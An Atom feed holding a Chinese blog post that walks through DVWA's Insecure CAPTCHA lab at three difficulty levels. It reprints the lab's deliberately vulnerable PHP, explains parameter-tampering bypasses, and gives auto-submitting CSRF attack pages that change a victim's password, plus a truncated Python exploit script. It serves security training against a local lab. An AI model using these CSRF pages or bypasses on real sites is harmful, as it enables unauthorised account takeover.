<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Somnus&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Foxgrin.github.io/"/>
  <updated>2018-07-16T08:02:16.296Z</updated>
  <id>https://Foxgrin.github.io/</id>
  
  <author>
    <name>Somnus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dvwa-Insecure CAPTCHA</title>
    <link href="https://Foxgrin.github.io//posts/51335/"/>
    <id>https://Foxgrin.github.io//posts/51335/</id>
    <published>2018-07-16T06:10:00.000Z</published>
    <updated>2018-07-16T08:02:16.296Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中关于不安全的验证码的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match? </span><br><span class="line">        if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            // Show next stage for the user </span><br><span class="line">            echo &quot; </span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; </span><br><span class="line">                &lt;/form&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Both new passwords do not match. </span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check to see if both password match </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with the passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码很长，但是我们并不需要所有的代码，关键代码在于服务器的两个执行流程，首先会使用Google提供reCAPTCHA服务，这个服务会产生一个验证码(PS:访问到这个验证码需要翻墙，这里没有翻墙，所以显示不出验证码，但不影响我们的测试)，待用户输入验证码之后调用一个recaptcha_check_answer函数检查用户输入的正确性，该函数具体语法如下：</p><p><em>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</em> </p><p>参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：$is_valid是布尔型的，表示校验是否有效，$error是返回的错误代码。</p><p>若校验成功，服务器会返回一个修改密码的表单，待用户修改密码</p><p>那么就有个疑问，是不是一定要通过输入正确的验证码才能修改得了密码呢，服务器的意思虽然是这样，但是我们仔细观察源代码，发现了一个很关键的参数$_POST[‘step’]，服务器只是根据这个参数的值来分别执行校验和修改密码的两个流程，说到这里，就很明白了，我们只需要修改step的值为2，就能轻松的跳过校验过程，所以说这个验证码是不安全的，或者说这是一个不安全的校验过程</p><p>我们利用burp抓包修改step值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功修改密码为admin</p><p>还可以利用CSRF攻击的原理诱骗受害者访问一个攻击页面，攻击页面伪造请求给服务器修改密码</p><p>攻击页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/captcha/&quot;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>受害者访问攻击页面，最终跳转到修改密码成功的页面，缺点就是会被受害者察觉到密码被修改了</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party </span></span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ <span class="string">'recaptcha_private_key'</span> ], </span><br><span class="line">        $_SERVER[ <span class="string">'REMOTE_ADDR'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_challenge_field'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_response_field'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail? </span></span><br><span class="line">    <span class="keyword">if</span>( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly </span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// Show next stage for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">" </span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt; </span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Both new passwords do not match. </span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>; </span><br><span class="line">            $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with the passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相较于上一关，这里多了一个对passed_captcha参数的验证，这个参数是通过用户输入正确的验证码后自动提交的一个参数，当然我们也可以利用burp自己构造</p><p>老规矩先抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改step参数，并且增加passed_captcha参数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改密码成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样的我们依然可以伪造CSRF攻击页面，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;attack-medium&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&apos;http://127.0.0.1/dvwa/vulnerabilities/captcha/&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;passed_captcha&apos; value=&apos;true&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var test=document.getElementById(&apos;transfer&apos;);</span><br><span class="line">test.submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Hide the CAPTCHA form</span><br><span class="line">$hide_form = true;</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_new  = $_POST[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_POST[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Check CAPTCHA from 3rd party</span><br><span class="line">$resp = recaptcha_check_answer(</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ],</span><br><span class="line">$_POST[&apos;g-recaptcha-response&apos;]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos;</span><br><span class="line">&amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos;</span><br><span class="line">)</span><br><span class="line">)&#123;</span><br><span class="line">// CAPTCHA was correct. Do both new passwords match?</span><br><span class="line">if ($pass_new == $pass_conf) &#123;</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for user</span><br><span class="line">$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Ops. Password mismatch</span><br><span class="line">$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;</span><br><span class="line">$hide_form = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">// What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">$html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">$hide_form = false;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关没有了对step参数的检测，关键检测点在于语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos;</span><br><span class="line">&amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos;</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如果这个if语句执行不了，那么就验证失败，无法修改密码，所以我们必须让这个if语句执行，也就是里面的逻辑语句为真，而里面的逻辑语句是由两个逻辑语句通过 || 拼接成的，所以我们只需要让其中一个逻辑语句为真，条件就可以成立，再看里面检测的参数，$resp参数明显是我们不可控的，所以我们只要将重点放在参数g-recaptcha-response和参数HTTP_USER_AGENT上面就行了，要让if语句执行，就控制参数g-recaptcha-response值为hidd3n_valu3，请求头的user_agent为reCAPTCHA</p><p>依然是抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后修改参数g-recaptcha-response和参数HTTP_USER_AGENT</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>由于无法用javascript代码修改user_agent参数，所以无法用CSRF原理攻击</p><p>最后附上本关修改密码的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/captcha/"</span></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'103'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'reCAPTCHA'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://127.0.0.1/dvwa/vulnerabilities/captcha/'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, 